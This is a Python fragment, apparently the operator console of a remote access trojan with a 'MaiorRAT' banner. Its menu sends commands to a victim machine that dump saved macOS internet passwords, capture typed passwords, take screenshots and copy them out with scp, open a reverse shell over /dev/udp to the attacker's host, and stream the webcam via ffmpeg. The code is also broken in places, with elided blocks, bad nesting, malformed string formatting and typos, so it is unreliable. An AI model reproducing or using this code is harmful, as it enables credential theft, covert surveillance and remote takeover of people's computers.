print("___  ___      _           ______  ___ _____")
print("|  \/  |     (_)          | ___ \/ _ \_   _|")
print("| .  . | __ _ _  ___  _ __| |_/ / /_\ \| |")
print("| |\/| |/ _` | |/ _ \| '__|    /|  _  || |")
print("| |  | | (_| | | (_) | |  | |\ \| | | || |")
...
while True:
    ...
    if a==2:
    	...
    	command = ("security find-internet-password -gs {b}")
    	client_socket.send(command.encode())
    	results = client_socket.recv(BUFFER_SIZE).decode()
    	print(results)
    if a==3:
    	...
    	print("Just wait, when user will enter password you will find it in tmp folder")
    	client_socket.send(command.encode())
    	results = client_socket.recv(BUFFER_SIZE).decode()
    	print(results)
    if a==4:
    	os.system("clear")
    	url = input("What url you want to open")
    ...
    if a==5:
       ...
       сommand = ("import -window {name} -resize 1920x1080 -delay 200 screenshot.png")
       client_socket.send(command.encode())
       results = client_socket.recv(BUFFER_SIZE).decode()
       print(results)
       dest = input("Enter directory: ")
       usrm = input("Enter your username:")
       command = ("scp -3 {name}@127.0.0.1:/image.jpeg {usrm}@{SERVER_HOST}:{dest}")
       client_socket.send(command.encode())
       results = client_socket.recv(BUFFER_SIZE).decode()
       print(resultd)
       if a==6:
       ...
       if a==7:
       	os.system("clear")
       	command = ("watch -n1 40 setsid sh -i >& /dev/udp/{SERVER_HOST}/{SERVER_PORT} 0>&1")
       ...
       if a==8:
       	...
       	if a==12:
       		...
       		client_socket.send(command.encode())
       		l = '"1"'
       		command = ("./ffmpeg -f avfoundation -i {l} -f avi udp://{SERVER_HOST:{SERVER_PORT}")
       		client_socket.send(command.encode())
       	else:
       		print("Oops")